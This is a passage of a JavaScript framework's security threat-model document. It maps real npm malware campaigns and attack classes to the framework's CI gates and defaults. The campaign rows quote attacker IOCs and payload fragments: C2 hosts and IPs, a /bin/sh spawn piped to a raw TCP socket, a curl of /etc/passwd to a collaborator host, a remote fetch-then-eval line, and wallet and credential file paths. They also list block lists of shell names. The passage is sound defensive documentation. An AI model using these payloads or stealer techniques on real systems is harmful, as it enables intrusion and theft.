| Telegram-bot SSH-backdoor typosquat campaign (Socket [write-up](https://socket.dev/blog/npm-malware-targets-telegram-bot-developers) — three npm typosquats of the popular `node-telegram-bot-api` library (`node-telegram-utils`, `node-telegram-bots-api`, `node-telegram-util`, published by `jordankakashi` and starjacked to the legitimate repo's 19k+ star count) ran a hidden `addBotId()` routine from the library constructor that, on Linux only, `mkdir`'d `~/.ssh`, appended two attacker SSH public keys to `~/.ssh/authorized_keys` for persistent passwordless remote login that survives uninstalling the package, fingerprinted the victim's external IP via `https://ipinfo.io/ip`, and POSTed the IP plus the Unix username to `https://solana.validator.blog/v1/check?ip=…&name=…`. None of the primitives touch `child_process`, `vm`, `eval`, `new Function`, dynamic remote `import()`, TLS bypass, or `HOME` mutation — so the upstream `verify-no-remote-exec` and the GemStuffer half of `verify-no-registry-exfiltration` do NOT catch them on their own.) | Five overlapping gates close this end-to-end. **(a) 24 h release-age cooldown:** `minimum-release-age=1440` in both the root [`.npmrc`](.npmrc) and every scaffolded template `_npmrc` keeps consumers off the first-day install window in which a freshly published typosquat is most dangerous. **(b) Install-time execution is off by default:** `ignore-scripts=true` in both root and template `_npmrc` blocks `postinstall` / `preinstall` / `prepare` hooks — the Telegram-bot family fired from a library constructor rather than a lifecycle hook, but a future variant that goes the easier `postinstall` route is already blocked. **(c) No transitive entry path through core:** [`pnpm verify:no-runtime-deps`](scripts/verify-no-runtime-deps.ts) keeps `@daloyjs/core` at **zero** runtime dependencies, so a typosquat of one of our transitive deps cannot exist — there are none. **(d) Campaign-specific IOC blocks in core:** `scripts/verify-no-registry-exfiltration.ts` (run as `pnpm verify:no-registry-exfiltration` in CI and in both publish jobs of [`release.yml`](.github/workflows/release.yml)) refuses any reference in `src/**` to `authorized_keys` (the file the campaign appends attacker SSH keys to), `~/.ssh/` (the dir it `mkdir`s when no `.ssh` exists yet), the documented C2 host `solana.validator.blog`, or the public IP-discovery endpoints commonly used as a DNS-less fingerprinting step (`ipinfo.io/ip`, `icanhazip.com`, `ifconfig.me`, `api.ipify.org`, `checkip.amazonaws.com`) — a backend HTTP framework reads the client IP from request headers and never from a public lookup, so each has zero legitimate use inside `@daloyjs/core`. **(e) No in-process execution channel in core:** `scripts/verify-no-remote-exec.ts` continues to refuse `child_process` / `vm` / bare `eval` / `new Function(…)` / remote dynamic `import("http(s)://…")`, so a malicious republish of `@daloyjs/core` itself has no primitive to drop in an `addBotId`-shape constructor-time SSH-key-injection backdoor that downloads further code or shells out. Regression-tested in [`tests/cookies-and-temporal-claims.test.ts`](tests/cookies-and-temporal-claims.test.ts) (positive samples for `authorized_keys`, `~/.ssh/`, `solana.validator.blog`, and each public IP-discovery endpoint, plus the live walk of `src/**`). |
| Payment-callback reverse-shell campaign (Socket [write-up](https://socket.dev/blog/npm-package-advcash-integration-triggers-reverse-shell) — the malicious `@naderabdi/merchant-advcash` npm package posed as an Advcash payment-gateway integration with believable SHA-256 hashing, request validation, and currency checks, but hid a self-executing reverse shell at the top of the `url_success(req, res)` payment-success callback: `cp.spawn("/bin/sh", [])` piped to `new net.Socket().connect(8443, "65.109.184.223")`. The payload only detonates **at runtime during a successful transaction**, not at install or import, so install-time scanners and `ignore-scripts=true` cooldown gates do NOT see it — and because the C2 channel is raw TCP rather than HTTP, the IOC IP appears as a bare string literal (not inside an `http(s)://` URL), so the existing raw-IPv4-URL gate does not catch it on its own.) | Five overlapping gates close this end-to-end. **(a) 24 h release-age cooldown:** `minimum-release-age=1440` in both the root [`.npmrc`](.npmrc) and every scaffolded template `_npmrc` keeps consumers off the first-day install window in which a freshly published runtime-only payload is most dangerous. **(b) No transitive entry path through core:** [`pnpm verify:no-runtime-deps`](scripts/verify-no-runtime-deps.ts) keeps `@daloyjs/core` at **zero** runtime dependencies, so a runtime-detonating payment-integration shim cannot ride into a Daloy consumer's `node_modules` via us. **(c) No `child_process` / no `node:net` reverse-shell primitive in core:** `scripts/verify-no-remote-exec.ts` (run as `pnpm verify:no-remote-exec` in CI and in both publish jobs of [`release.yml`](.github/workflows/release.yml)) refuses `node:child_process` / `child_process` imports — the `cp.spawn("/bin/sh", [])` half of the Advcash payload cannot land in `@daloyjs/core` because there is no way to import a `spawn` to call. **(d) Campaign-specific IOC blocks in core:** `scripts/verify-no-registry-exfiltration.ts` (run as `pnpm verify:no-registry-exfiltration` in CI and in both publish jobs of [`release.yml`](.github/workflows/release.yml)) refuses the documented C2 IP `65.109.184.223` as a bare literal (mirroring the RATatouille `85.239.62.36` IOC) AND refuses any shell-name string literal (`/bin/sh`, `/bin/bash`, `/bin/zsh`, `/bin/dash`, `/bin/ksh`, `/bin/ash`, `cmd.exe`) in `src/**` — Daloy core never shells out, so any of these as a runtime literal is a hard IOC and a belt-and-braces gate against an aliased-spawn / decoded-string bypass that reconstructs `"child_process"` at runtime. **(e) Application-side mitigation:** Daloy's own request handlers are pure user code; the framework cannot stop an application that imports a malicious payment-callback library from triggering its runtime payload, but `secureHeaders()`, strict CSP, egress controls at the platform layer, and Socket-style dependency scanning are the recommended end-to-end defense for runtime-only payloads of this shape. Regression-tested in [`tests/cookies-and-temporal-claims.test.ts`](tests/cookies-and-temporal-claims.test.ts) (positive samples for the bare IOC IP, the `client.connect(8443, ...)` shape, and each reverse-shell shell-name literal; negative samples for benign dotted-quad version strings and line-comment mentions; plus the live walk of `src/**`). |
| Lazarus BeaverTail / InvisibleFerret typosquat wave (Socket [write-up](https://socket.dev/blog/lazarus-strikes-npm-again-with-a-new-wave-of-malicious-packages) — six North-Korean-Lazarus-linked npm typosquats (`is-buffer-validator`, `yoojae-validator`, `event-handle-package`, `array-empty-validator`, `react-event-dependency`, `auth-validator`) mimicking the names of widely-trusted validator libraries (`is-buffer-validator` typosquats Feross Aboukhadijeh's `is-buffer`, ~33M weekly downloads). Five of the six were backed by attacker-controlled GitHub repos to fake open-source legitimacy. The embedded **BeaverTail** stealer iterates up to 200 browser profiles to extract Chrome / Brave / Firefox `Login Data` saved-password databases and Chromium `Local Extension Settings` (MetaMask / Phantom / Exodus wallet-extension data), slurps macOS Keychain archives from `~/Library/Keychains/`, and steals crypto wallet keys from `~/.config/solana/id.json` (Solana CLI keypair) and `exodus.wallet` (Exodus desktop wallet). It then exfiltrates everything to `hxxp://172.86.84[.]38:1224/uploads` and downloads the second-stage **InvisibleFerret** backdoor (SHA256 `6a104f07ab6c5711b6bc8bf6ff956ab8cd597a388002a966e980c5ec9678b5b0`) from `hxxp://172.86.84[.]38:1224/pdown` to `${tmpDir}/p.zi` / `${tmpDir}/p2.zip` via `curl` + the legacy `request` Node module, then extracts it with `tar -xf` for persistence. Because the C2 IP is concatenated into a URL from a bare-string variable rather than written inline as a literal `http://172.86.84.38:1224/…`, the existing raw-IPv4-URL gate would not catch the assignment on its own.) | Six overlapping gates close this end-to-end. **(a) 24 h release-age cooldown:** `minimum-release-age=1440` in both the root [`.npmrc`](.npmrc) and every scaffolded template `_npmrc` keeps consumers off the first-day install window in which a freshly published Lazarus typosquat is most dangerous; Socket petitioned npm to remove all six packages, and the cooldown bridges the gap until removal lands. **(b) Install-time execution is off by default:** `ignore-scripts=true` in both root and template `_npmrc` blocks the `postinstall` / `preinstall` / `prepare` channel; BeaverTail in this campaign fires on first `require`, but a future variant that goes the easier lifecycle-hook route is already blocked. **(c) No transitive entry path through core:** [`pnpm verify:no-runtime-deps`](scripts/verify-no-runtime-deps.ts) keeps `@daloyjs/core` at **zero** runtime dependencies, so none of the six Lazarus typosquats can ride into a Daloy consumer's `node_modules` via us — there are no transitive deps for one to typosquat. **(d) Direct typosquat blocklist in `pnpm-lock.yaml`:** [`scripts/verify-lockfile-sources.ts`](scripts/verify-lockfile-sources.ts) (run as `pnpm verify:lockfile-sources` in CI) refuses any pnpm-lock entry — package key, snapshot key, `name:` field, or dependency-map entry — that resolves to any of the six documented Lazarus typosquat names. A future PR that pulls one of them in (direct or transitive) is rejected at CI before merge. Exact-name matching: the legitimate `is-buffer` (33M weekly downloads) is allow-listed and never flagged. **(e) No in-process execution / exfiltration channel in core:** `scripts/verify-no-remote-exec.ts` (run as `pnpm verify:no-remote-exec` in CI and in both publish jobs of [`release.yml`](.github/workflows/release.yml)) refuses `child_process` (the `curl` shell-out), `vm` / `eval` / `new Function(…)` (the second-stage payload loader), and dynamic `import("http(s)://…")` (remote `require`), so a malicious republish of `@daloyjs/core` itself has nowhere to land a BeaverTail-shape stealer or the InvisibleFerret loader. **(f) Campaign-specific IOC blocks in core:** `scripts/verify-no-registry-exfiltration.ts` (run as `pnpm verify:no-registry-exfiltration` in CI and in both publish jobs of [`release.yml`](.github/workflows/release.yml)) refuses any reference in `src/**` to the documented C2 IP `172.86.84.38` as a bare literal (so the variable-assigned variant is caught even when not in an `http(s)://` URL), the Chrome/Brave/Chromium `Login Data` saved-password DB filename, the Chromium `Local Extension Settings` wallet-extension path, the `~/.config/solana/id.json` Solana CLI keypair path, the `exodus.wallet` Exodus desktop-wallet filename, and the `/Library/Keychains/` macOS keychain directory — a backend HTTP framework has zero legitimate reason to read browser credential databases, crypto-wallet keypair files, or OS-level keychain stores, so any of these as a runtime literal is a hard IOC. Regression-tested in [`tests/cookies-and-temporal-claims.test.ts`](tests/cookies-and-temporal-claims.test.ts) (positive samples for each IOC literal, plus the live walk of `src/**`) and [`tests/supply-chain-config.test.ts`](tests/supply-chain-config.test.ts) (positive samples for each of the six typosquat names in a synthetic pnpm-lock, plus a regression that the legitimate `is-buffer` is never flagged). |
| The three npm-malware archetypes (Aikido ["Malware Dating Guide"](https://www.aikido.dev/blog/the-malware-dating-guide-understanding-the-types-of-malware-on-npm) — **(1) PoC** packages whose only payload is a `preinstall` / `install` / `postinstall` lifecycle hook that `curl`s `/etc/passwd` or hostname/username/DNS-server metadata to an `oastify.com` Burp Collaborator endpoint; **(2) Imposter** packages (typosquats / lookalike-author packages such as `requests-promises` vs. the legitimate `request-promise`, or packages falsely claiming "Microsoft" as the author) that ship a `postinstall` hook pointing at a near-name file like `lib/rq.js` instead of the legit `lib/rp.js` and zip browser-profile dirs (Chrome / Edge / Opera / Opera GX / Brave) via PowerShell `Compress-Archive` to a base64-encoded Discord webhook; **(3) Hidden / Obfuscated Trojan** packages with no lifecycle hooks at all that look like a benign "logger" utility but, on first `require`, hex-decode strings to reconstruct `"require"` / `"axios"` / `"get"` / a C2 URL / `"then"` and call `require("axios").get(url).then(r => r.data).catch(err => eval(err.response.data || "404"))` to fetch attacker-served code and `eval` it at runtime) | All three archetypes are blocked end-to-end by gates that are already documented above. **(1) PoC archetype** — `ignore-scripts=true` in both the root [`.npmrc`](.npmrc) and every scaffolded template `_npmrc` (the four `packages/create-daloy/templates/*/_npmrc` files) means `pnpm install` never runs the `preinstall` / `install` / `postinstall` / `prepare` hook the PoC depends on, so the `curl /etc/passwd … | oastify.com` payload never detonates. As a publish-side gate, `scripts/verify-no-lifecycle-scripts.ts` (run as `pnpm verify:no-lifecycle-scripts` in CI and in both publish jobs of [`release.yml`](.github/workflows/release.yml)) refuses any lifecycle hook in `@daloyjs/core` / `create-daloy` / scaffolded templates, so a compromise of *us* cannot ship a PoC-shape payload onto consumers either. **(2) Imposter archetype** — `minimum-release-age=1440` in both root and template `_npmrc` keeps consumers off the first-day install window in which a freshly published typosquat is most dangerous; `frozen-lockfile=true` / `verify-store-integrity=true` plus [`scripts/verify-lockfile-sources.ts`](scripts/verify-lockfile-sources.ts) (run as `pnpm verify:lockfile-sources`) keep the pinned `@daloyjs/core` resolution from silently sliding to a lookalike registry or fork; and [`pnpm verify:no-runtime-deps`](scripts/verify-no-runtime-deps.ts) keeps core at **zero** runtime dependencies so a typosquat of one of our transitive deps cannot exist — because we have none. The same `verify-no-lifecycle-scripts` gate keeps a malicious republish of `@daloyjs/core` itself from ever shipping the `postinstall` → `lib/rq.js` Imposter pattern. **(3) Hidden / Obfuscated Trojan archetype** — this is exactly the pattern `scripts/verify-no-remote-exec.ts` was written for: it refuses bare `eval(...)`, `new Function(...)` from a string, `node:child_process` / `child_process` imports, `node:vm` / `vm` imports, and dynamic `import("http(s)://…")` of remote code in `src/**` (run as `pnpm verify:no-remote-exec` in CI and in both publish jobs of [`release.yml`](.github/workflows/release.yml)). The exact `require("axios").get(url).then(...).catch(err => eval(err.response.data))` primitive from the Aikido write-up cannot land in `@daloyjs/core` because (a) the bare `eval(...)` call is statically rejected, (b) `verify-no-runtime-deps` keeps `axios` (or any other runtime dep) out of the published tarball so there is nothing to call `.get(url)` on, and (c) the hex-decoded-string obfuscation trick the article highlights as a way to hide the eval payload from human review is itself rejected by `scripts/verify-no-invisible-unicode.ts` for the GlassWorm-shape Unicode-Tag carrier and would still leave a literal `eval(` in source for `verify-no-remote-exec` to reject. Closes the [Aikido "Malware Dating Guide" class](https://www.aikido.dev/blog/the-malware-dating-guide-understanding-the-types-of-malware-on-npm) for all three archetypes — PoC, Imposter, and Hidden Trojan — using gates already exercised by [`tests/cookies-and-temporal-claims.test.ts`](tests/cookies-and-temporal-claims.test.ts) (live walks of `src/**`, every tracked `package.json`, and every scaffolded template `_npmrc`). |
| Server-side template injection (SSTI) | DaloyJS ships **no** template engine and **no** string-eval rendering API. The framework is JSON-first; the only HTML emitted by core is the optional API-docs page, whose interpolated values (title, spec URL, Scalar configuration) are HTML-escaped via the helper in [`src/docs.ts`](src/docs.ts) and regression-tested against `<script>` / quote-break payloads in [`tests/docs-logger-adapters.test.ts`](tests/docs-logger-adapters.test.ts). The Thymeleaf / CVE-2026-40478 class ([Snyk write-up](https://snyk.io/blog/thymeleaf-injection/)) requires a template engine that compiles user-controlled expressions; that surface does not exist in core. |
| Aikido "Cloud Application Security: Securing SaaS and Custom Cloud Apps" guide ([article](https://www.aikido.dev/blog/cloud-application-security)) — a four-pillar best-practice catalog for cloud-native **custom-built** applications: **(1) Shift-left** (SAST + SCA + secret scanning + DAST wired into CI), **(2) Secure APIs** (strong authentication / authorization, rate limiting, input validation), **(3) Harden the runtime environment** (container hardening, IaC posture, CSPM), **(4) Manage access** (MFA, RBAC, least-privilege reviews). Daloy is a backend HTTP framework, so the **custom-app** half of the guide is in-scope for first-party defaults; the **third-party SaaS** half (Google Workspace / Slack / Salesforce admin posture) is below the framework layer. | All four pillars are already covered by primitives that ship in `@daloyjs/core` and gates that run in CI / publish. **(1) Shift-left, enforced at PR time.** The static-analysis gates live under [`scripts/`](scripts) and run in CI (and, where supply-chain-relevant, in both publish jobs of [`release.yml`](.github/workflows/release.yml)): `verify:no-leaked-credentials` is the secret-scanning gate (filename + content scan for AWS / GitHub PAT / npm / Slack / Stripe / Google / JWT / PEM / `_authToken=`); `verify:no-remote-exec` / `verify:no-encoded-payloads` / `verify:no-invisible-unicode` / `verify:no-vulnerable-sandboxes` / `verify:no-registry-exfiltration` / `verify:no-unsafe-buffer` / `verify:secret-comparisons` are the SAST gates; `verify:lockfile-sources` / `verify:no-runtime-deps` / `verify:no-lifecycle-scripts` / `verify:dep-licenses` are the SCA gates; the daily `pnpm audit --prod` job ([`vuln-scan.yml`](.github/workflows/vuln-scan.yml)) is the SCA continuous-monitoring signal; and the weekly DAST job ([`dast.yml`](.github/workflows/dast.yml)) runs the OWASP ZAP baseline scan against the bookstore example on a real listening server — closing the dynamic half of the [Aikido SAST-vs-DAST](https://www.aikido.dev/blog/sast-vs-dast-what-you-need-to-now) guidance for the framework surface. **(2) Secure APIs, first-party.** Strong auth: `bearerAuth`, `basicAuth`, `jwt()` (PS256 / RS256 / ES256 / EdDSA via [`src/jwt.ts`](src/jwt.ts) with `kid`-pinned JWKS rotation in [`src/jwk.ts`](src/jwk.ts)), signed-cookie `session()`, and `timingSafeEqual()` from [`src/security.ts`](src/security.ts) (with `pnpm verify:secret-comparisons` rejecting every short-circuiting comparison against header-derived values in `src/**`). Rate limiting: first-party `rateLimit()` with custom key generators and optional Redis store ([`src/rate-limit-redis.ts`](src/rate-limit-redis.ts)), paired with `loadShedding()` for concurrency caps. Input validation: contract-first Standard Schema (Zod 4 / Valibot / ArkType / TypeBox) on `request.body` / `request.query` / `request.params` **before** the handler runs (with `responses[N].body` validating on the way out), plus the three non-JSON parsers (`queryToObject`, urlencoded, multipart) funneling keys through `isForbiddenObjectKey` to drop `__proto__` / `constructor` / `prototype` before assignment. Full per-item mapping in the OWASP API Security Top 10 row below. **(3) Harden the runtime environment, in-process.** Core-enforced body cap (default 1 MiB, `Content-Length` rejected pre-read when oversize), per-handler `requestTimeoutMs` (default 30 s, plus Node `requestTimeout` / `headersTimeout` / `maxHeaderSize`), `secureHeaders()` (CSP nonce + Trusted Types, HSTS, COOP, CORP, `X-Frame-Options`, `X-Content-Type-Options`, Permissions-Policy), `fetchGuard()` ([`src/fetch-guard.ts`](src/fetch-guard.ts)) default-denying SSRF against loopback / RFC1918 / link-local (every documented cloud metadata IP) / unique-local / CGNAT / Oracle `192.0.0.0/24` / IANA-reserved / multicast / non-`http(s)` schemes, and `ipRestriction()` ([`src/ip-restriction.ts`](src/ip-restriction.ts)) for caller allow/deny lists. The published CycloneDX 1.5 + SPDX 2.3 SBOM (`dist/sbom.cdx.json` / `dist/sbom.spdx.json`, generated by [`scripts/generate-sbom.ts`](scripts/generate-sbom.ts) and locked at release time by `pnpm verify:sbom`) is the dependency-inventory of record for matching CVEs against installed `@daloyjs/core` / `create-daloy` versions — the npm `--provenance` Sigstore attestation binds those bytes to the `release.yml` workflow run on the Rekor transparency log. **(4) Manage access, primitives only.** Daloy ships the auth primitives (above) and the explicit `beforeHandle` / `app.group()` hook surface so RBAC and least-privilege checks live next to the route definition and are version-controlled with the application code; MFA enrollment, identity-provider integration, and periodic access reviews are application / operator concerns and are listed under "Explicitly out of scope" below. The website's [`/docs/security/owasp-api-top-10`](website/app/docs/security/owasp-api-top-10/page.tsx) page is the human-facing companion to the OWASP row below. **Out of scope (the guide's infrastructure and SaaS-admin halves):** third-party SaaS posture (Google Drive sharing settings, Slack admin policy, Salesforce permission sets), CSPM for AWS / GCP / Azure misconfigurations, container-image scanning, Kubernetes admission / pod-security policy, IaC posture, and end-user MFA enrollment — these live below the framework layer (platform / CSPM / IdP). Operators should pair Daloy with a CSPM tool (Aikido, Wiz, Orca, …) for the infrastructure half and an identity provider (Clerk, Auth0, Okta, WorkOS, …) for the access-review half. |
| OWASP API Security Top 10 (2023) — the canonical attack surface targeted by the "API security tools" market category (Aikido [API security tools roundup](https://www.aikido.dev/blog/api-security-tools), [OWASP API Security Top 10 (2023)](https://owasp.org/API-Security/editions/2023/en/0x11-t10/)). Most "API security tool" products in that roundup are runtime appliances that *bolt on* schema validation, rate limiting, auth checks, SSRF egress filtering, and inventory/spec drift detection to an existing app. Daloy ships those same primitives as first-party middleware so the protections live next to the route definition and are version-controlled with the application code. | **API1 — Broken Object Level Authorization (BOLA).** Application concern (only the handler knows whether `userId` may read `orderId`), but core makes the right place obvious: typed `params` from the request schema, an explicit `beforeHandle` hook per route (or grouped via [`src/dependency.ts`](src/dependency.ts) / `app.group()`), and the auth middlewares (`bearerAuth`, `basicAuth`, `jwt`, signed-cookie `session`) all expose the resolved principal on `ctx` so the comparison cannot silently fall through. **API2 — Broken Authentication.** First-party `bearerAuth`, `basicAuth`, `jwt()` (PS256/RS256/ES256/EdDSA via [`src/jwt.ts`](src/jwt.ts), with JWKS rotation in [`src/jwk.ts`](src/jwk.ts) and `kid` pinning), signed-cookie `session()`, and `timingSafeEqual()` from [`src/security.ts`](src/security.ts); `pnpm verify:secret-comparisons` rejects every short-circuiting comparison primitive against header-derived values in `src/**` (see the "Credential timing attacks" row above). Production-mode `csrf({ strategy: "fetch-metadata" })` rejects header-less bot replays of stolen session tokens (see the carding row above). **API3 — Broken Object Property Level Authorization (mass assignment + excessive data exposure).** Contract-first `request.body` / `request.query` / `request.params` schemas are validated by Standard Schema (Zod 4 / Valibot / ArkType / TypeBox) **before** the handler runs, so attacker-injected fields like `{ "isAdmin": true }` never reach `Object.assign` — and `responses[N].body` schemas validate on the way **out**, so a handler that forgets to project away a field never accidentally serializes it past the framework. The non-JSON parsers (`queryToObject`, urlencoded, multipart) additionally drop `__proto__` / `constructor` / `prototype` keys via `isForbiddenObjectKey` (see the Spring4Shell row above). **API4 — Unrestricted Resource Consumption.** Core-enforced body cap (default 1 MiB, `Content-Length` rejected pre-read when oversize), per-handler `requestTimeoutMs` (default 30 s, plus Node `requestTimeout` / `headersTimeout` / `maxHeaderSize`), first-party `rateLimit()` with custom key generators and optional Redis store ([`src/rate-limit-redis.ts`](src/rate-limit-redis.ts)), `loadShedding()` for concurrency caps under burst pressure, optional response `compression()` to bound bandwidth, and the `multipart` parser's per-field byte cap to stop a single oversized upload from starving the event loop. **API5 — Broken Function Level Authorization.** Routes are explicit (`app.route({ method, path, ... })`); the router emits a real **405 Method Not Allowed** with an `Allow` header instead of falling through to the next handler; middleware runs **unconditionally** on every request — there is no internal header an attacker can echo back to skip it (Next.js CVE-2025-29927 row above); the `except()` matcher consumes the same `url.pathname` the router sees, so case-mutated or rewrite-style paths cannot skip auth and still reach a protected handler (Qinglong CVE-2026-3965 row above). **API6 — Unrestricted Access to Sensitive Business Flows.** `rateLimit({ key: ctx => `${ctx.userId}:${cardBin}` })` per-account / per-card-bin / per-coupon-code, paired with `loadShedding()` and the Fetch-Metadata `csrf()` strategy, closes the "scripted bot replays the legit happy path" class — already documented end-to-end in the carding-attack row above for the WooCommerce / `disgrasya` scenario. **API7 — Server-Side Request Forgery.** `fetchGuard()` from [`src/fetch-guard.ts`](src/fetch-guard.ts) is the canonical defense — default-deny against loopback, RFC1918, link-local (every documented cloud metadata IP), unique-local, CGNAT (Alibaba `100.100.100.200`), `192.0.0.0/24` (Oracle Cloud), IANA-reserved, multicast/broadcast, and non-`http`/`https` schemes (`file:` / `data:` / `gopher:` / `ftp:`); manual redirect-following with re-validation at every hop; IPv4-mapped IPv6 recursively re-checked against the embedded IPv4. Cited end-to-end in the IMDS / Capital One / "simple email form" SSRF rows below. **API8 — Security Misconfiguration.** Defaults *are* the protection: `secureHeaders()` ships CSP nonce + Trusted Types, HSTS, COOP, CORP, `X-Frame-Options`, `X-Content-Type-Options`, Permissions-Policy out of the box; CORS is opt-in (no implicit `*`); `App` defaults set `bodyLimitBytes` / `requestTimeoutMs` so a misconfigured app still has the core caps; production mode redacts 5xx `detail` from problem+json automatically; the built-in docs UI ships with a strict CSP and CDN-hosted assets; the hardened root [`.npmrc`](.npmrc) (and every scaffolded template `_npmrc`) keeps misconfigured installs from being the foothold; CRLF/NUL in header names and values is rejected at construction and on every emit. **API9 — Improper Inventory Management.** OpenAPI 3.1 is generated from the same `app.route({...})` definition that runs in production — there is no separate hand-maintained spec to drift. `pnpm gen` emits a Hey API typed SDK from that spec; `app.introspect()` is a public API for runtime discovery (handlers, methods, paths, tags, deprecation, security requirements); `responses[N].body` schemas and `tags` / `deprecated` / `security` annotations live next to the route so a "shadow" v1/v2 endpoint cannot exist without showing up in the spec, the docs UI, the typed client, and `introspect()`. **API10 — Unsafe Consumption of APIs.** Outbound calls to third-party / partner APIs from a handler go through `fetchGuard()` for the SSRF half; the JSON-first `safeJsonParse` strips `__proto__` / `constructor` / `prototype` on every parsed body — and `src/jwt.ts` reuses the same reviver on attacker-controlled JWT header/payload claims so a polluted key in a federated identity provider's response cannot ride into user code via `Object.assign` / spread. Provider responses are validated by the same Standard Schema pipeline as inbound requests when the handler routes them through `responses[N].body` or its own `parseAsync`. **Out of scope (the application's responsibility):** the *policy* of BOLA / BOPLA / sensitive-business-flow rules, business-specific velocity thresholds, CAPTCHA / Turnstile, payment-gateway-specific fraud scoring, secret rotation cadence, and infrastructure-layer protections (TLS termination, WAF, DDoS mitigation, network segmentation) — see "Explicitly out of scope" below. The DAST job ([`.github/workflows/dast.yml`](.github/workflows/dast.yml)) exercises the framework-layer half of this row by running the OWASP ZAP baseline scan against the bookstore example on a real listening server every week — closing the dynamic half of the [Aikido SAST-vs-DAST](https://www.aikido.dev/blog/sast-vs-dast-what-you-need-to-now) guidance for the API Security Top 10 surface specifically. |
| Log-message expression injection (Log4Shell / CVE-2021-44228 class) | The Log4Shell class ([Snyk LiveRamp remediation write-up](https://snyk.io/blog/liveramp-used-snyk-to-remediate-log4shell/)) requires two ingredients: a logger that expands `${...}` lookups (JNDI, env, sys, `${lower:…}` nesting) on attacker-controlled strings, plus a runtime that can load and execute classes fetched over the network. **Neither exists in core.** The default `createLogger` in [`src/logger.ts`](src/logger.ts) is a pure structured JSON sink — it `Object.assign`s bindings, optionally walks the record for redaction, and writes the result with `JSON.stringify`. There is no `util.format` / printf-style expansion, no template compiler, no JNDI / env / sys lookup mechanism, and no string-eval over message or field values; an attacker-planted `${jndi:ldap://…}` in a `User-Agent` header that user code logs is serialized verbatim. Even if a third-party logger added such expansion, core has **zero** in-process execution primitives an exfiltrated payload could land on: `pnpm verify:no-remote-exec` (run in CI and in both publish jobs of [`release.yml`](.github/workflows/release.yml)) refuses any `child_process` / `vm` / bare `eval` / `new Function(…)` / remote `import("http(s)://…")` in `src/**`, so there is no equivalent of Java's network classloader to execute fetched bytecode. Regression-tested in [`tests/logger-redaction-and-header-smuggling.test.ts`](tests/logger-redaction-and-header-smuggling.test.ts) with JNDI / RMI / DNS / nested-`${lower:j}ndi` / env / sys / printf / template-tag payloads asserted to round-trip literally in message, field, nested field, array, and object-key positions. |
| Supply chain | pnpm strict isolation + `ignore-scripts` + `minimum-release-age` + verified store; SHA-pinned CI; OIDC publishing with provenance (see Supply-chain section below). |

### Explicitly out of scope (the framework will NOT defend)

- **DOS at the network layer** (SYN floods, amplification). Place DaloyJS
  behind a reverse proxy, WAF, or DDoS mitigation service.
- **Insecure handler code.** The framework cannot stop a route that constructs
  SQL via string concatenation, leaks secrets in error messages, or trusts
  unvalidated client input passed to the OS shell.
- **Template engines integrated by the application.** Core ships none. If you
  add `ejs`, `handlebars`, `pug`, `nunjucks`, or any other engine, you own
  the SSTI surface (the Thymeleaf / CVE-2026-40478 class). Treat template
  names as constants, never pass user input into an expression compiler, and
  HTML-escape every interpolated value.
- **Credential storage and rotation.** DaloyJS provides `bearerAuth`,
  `basicAuth`, and signed-cookie `session`. Hashing, key rotation, JWT verification,
  and OAuth flow correctness are the application's responsibility (use `jose`,
  `argon2`, or a dedicated identity provider).
- **TLS termination.** Production deployments must run behind HTTPS; the Node
  adapter speaks plain HTTP.
- **Runtime compromise.** If the underlying Node/Bun/Deno binary or the host
  is compromised, no framework can protect application data.

### Trust boundaries

```
[ Untrusted client ] --HTTPS--> [ Trusted reverse proxy / edge ]
          |
          v
        [ DaloyJS App.fetch ]   <- request/header sanitization,
          |                  body-size cap, timeouts,
          v                  problem+json
        [ User handlers ]
          |
          v
        [ Trusted data store ]   <- caller's responsibility
```

### AI-accelerated attackers

Modern attackers increasingly use LLMs and agentic tooling to read source,
enumerate routes, generate exploit payloads, and iterate variants at a pace a
human reviewer cannot match (see Aikido's
["How Security Teams Fight Back Against AI-Powered Hackers"](https://www.aikido.dev/blog/hacker-superpower-ai)
and the public reports it cites). DaloyJS does not treat "AI on the other end"
as a separate threat class — the same classes of bug (parser confusion, auth
bypass, header injection, timing leaks, SSRF, supply chain) are still what
gets exploited. What changes is that **every** bug in those classes is more
likely to be found, and **subtle** variants (case-mutated paths, padded
base64 signatures, `Content-Length` games, scriptable image formats disguised
as PNGs) now get tried by default. Our response is to shrink the surface and
make the remaining surface default-deny rather than to bolt on an AI
"WAF" at request time:

- **No string-eval / no template engine in core.** There is no `eval`, no
  `new Function`, no template compiler, and no shell helper in `src/`. SSTI
  and the Thymeleaf / CVE-2026-40478 class have no surface to land on.
- **Default-deny on the request path.** Body cap, header CRLF/NUL rejection,
  router path-traversal rejection, real `405`, and per-handler timeout all
  run in core before user code; an LLM-generated variant has to bypass the
  check, not just find a forgotten branch.
- **Constant-time secret handling, enforced by CI.** `timingSafeEqual()` is
  the only sanctioned primitive; `pnpm verify:secret-comparisons` rejects the
  full short-circuiting comparison family against any header-derived value in
  `src/` (`===`, `!==`, `.startsWith`, `.endsWith`, `.includes`, `.indexOf`,
  `.localeCompare`, …). Variant-generation against secret checks has nowhere
  to land that compiles.
- **Auth/router parity.** The `except()` matcher consumes the same
  `url.pathname` the router sees (no double-decode, no case folding), so the
  Qinglong CVE-2026-3965 / CVE-2026-4047 class of "case-mutated path skips
  auth but still reaches the handler" is blocked in core. Regression-tested
  in [`tests/path-auth-bypass-regression.test.ts`](tests/path-auth-bypass-regression.test.ts).
- **Cross-origin WebSocket hijacking blocked at registration.** `app.ws()`
  refuses-at-registration in production unless the route opts in to an
  origin policy, so drive-by upgrade attempts get `403` before any
  cookie-bearing handler runs.
- **Magic-byte file validation that rejects scriptable image formats.**
  `fileField()` refuses SVG / MVG / MSL / PostScript / EPS by default when
  `magicBytes` is enabled, closing the ImageTragick (CVE-2016-3714) class
  against renderers that an attacker would otherwise try to exploit via a
  PNG-shaped wrapper.
- **No legacy `Buffer` API in source.** `pnpm verify:no-unsafe-buffer`
  refuses `new Buffer(...)` and `Buffer.allocUnsafe*(...)`, so an LLM-suggested
  "speed" patch that ships uninitialized memory through a response cannot be
  merged.
- **Webhook signature parsing is prefix-locked.** HMAC helpers parse only
  known algorithm prefixes (`sha256=…`) and never strip on bare `=`, so
  padded-base64 signatures aren't truncated into a forged match.
- **Supply chain treated as part of the request path.** pnpm strict isolation,
  `ignore-scripts`, `minimum-release-age`, SHA-pinned CI actions, OIDC publish
  with provenance, and the three-layer leaked-credentials gate
  (`package.json#files` whitelist + filename gate + content gate in
  `scripts/verify-no-leaked-credentials.ts`) close the path an AI-assisted
  worm uses to ship a poisoned dependency or a tarball containing a `.env`.
- **Documented operator boundary.** This file states explicitly what core
